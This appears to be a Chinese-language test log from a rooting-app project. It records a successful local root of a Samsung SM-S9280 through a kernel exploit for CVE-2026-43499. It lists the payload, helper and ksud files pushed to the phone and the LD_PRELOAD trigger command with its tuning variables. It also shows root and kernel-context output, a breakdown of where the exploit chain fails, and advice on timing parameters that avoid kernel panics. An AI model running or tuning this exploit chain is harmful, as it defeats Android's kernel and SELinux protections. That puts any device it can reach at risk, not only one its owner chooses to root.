# SM-S9280 港版 S9280ZHU6EZIF —— CVE-2026-43499 真机试跑记录（2026-10-31）

> 目的：验证第一引擎（CVE-2026-43499）在 **SM-S9280 / One UI 9.0 (EZIF)** 上是否可用。
> 该 target（`e3q-S9280ZHU6EZIF`）在 App 里是 `tested = false`，此前没有真机记录。

## 设备

| 项 | 值 |
|---|---|
| 型号 | SM-S9280（港版 S24 Ultra，e3q / 骁龙 8 Gen 3 for Galaxy） |
| 系统 | Android 17，`CP2A.260605.016.S9280ZHU6EZIF` |
| 内核 | `6.1.162-android14-11-34343818-abS9280ZHU6EZIF`（构建 2026-09-20） |
| 安全补丁 | 2026-09-05 |
| 指纹 | `samsung/e3qzhx/e3q:17/CP2A.260605.016/S9280ZHU6EZIF:user/release-keys`（与 target 完全匹配） |
| 状态 | 未 root，shell 域（uid 2000） |

## 方法（复刻 App 的 rootflow）

```sh
# 三件套（取自 App 资产）
push cve-2026-43499-S9280ZHU6EZIF → /data/local/tmp/rms24/payload
push cve-2026-43499-root           → /data/local/tmp/rms24/helper
push ksud-ezif-32601               → /data/local/tmp/rms24/ksud
chmod 755 ...

# 触发（一次只尝试 1 次，失败后重启再试 —— 与 App 设计一致）
LD_PRELOAD=/data/local/tmp/rms24/payload \
CVE43499_ROOT_HELPER=/data/local/tmp/rms24/helper \
EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=45 EXPLOIT_ATTEMPT_TIMEOUT_SEC=120 \
/system/bin/sh -c true
```

## 结果：**成功拿到 root（6 轮中第 5 轮）**

```
helper: uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
root umh result wake=1 complete=1 retval=0 socket=1     ← 成功那轮的关键行
```

随后 KernelSU late-load 成功：
```
/proc/modules: kernelsu 221184 0 - Live (O)
ksud debug info: version 32601, lkm=true, late_load=true
已装管理器: me.weishu.kernelsu / cn.nanoturtle.rootmys9280
```

## 失败分布（说明这是"四段概率链"，不是单点 bug）

| 阶段 | 失败签名 | 次数 |
|---|---|---|
| ① pipe 页塑形 | `pipe KernelSnitch sk_buff page leak failed` | 1 |
| ② PI-futex 窗口 | `app fops slide attempt=1/1 triggered=0 verified=0` | 2 |
| ④ UMH 收尾 | `root umh pool recheck busy ...; aborting attempt`（线程池有在飞的 UMH 工作，防御性放弃） | 1 |
| — | 设备掉线重启 | 1 |

## 调优结论（重要）

- **不要照搬 BYD9 的 `SLIDE_WAIT_NSEC=300ms` + `APP_FOPS_FRESH_PAGE_ATTEMPTS=5`**：
  在本机型上实测**直接 panic 重启**（窗口过头 → 后续 CFI 写落到只读页 →
  `FSC=0x0e permission fault`）。已在 `src/targets/e3q-S9280ZHU6EZIF/target.h` 回退并留注释。
- 正确方向：在本机**二分 `SLIDE_WAIT_NSEC`（先试 100~150ms）**，并配合低负载窗口
  （开机初期 load1 常 13+，payload 自己会警告"成功率明显下降"）。

## root 的时效性（必须注意）

- root 能力挂在 payload 起的 **root 守护进程**（`/data/local/tmp/temp_su.sock`）上，
  只在本次运行窗口内有效；日志收尾 `root umh settle done` 后守护进程退出。
- 收尾/late-load 之后 SELinux 回到 **Enforcing**，此时 `helper -c` 连接 socket 会
  `Permission denied`（shell 域在 Enforcing 下连不上）。
- 所以：**拿到 root 要立刻用完窗口**（趁 Permissive + 守护进程活着），
  或后续走 KernelSU 管理器授权。

## 下一步

1. 参数二分：`SLIDE_WAIT_NSEC` × `APP_FOPS_FRESH_PAGE_ATTEMPTS`，只跑到 slide 阶段看
   `triggered=1`，找不 panic 的最佳值
2. 每次运行前等 load 降下来（或固定 boot 后 N 秒）
3. 稳定后把该 target 在 App 里置为 `tested = true`
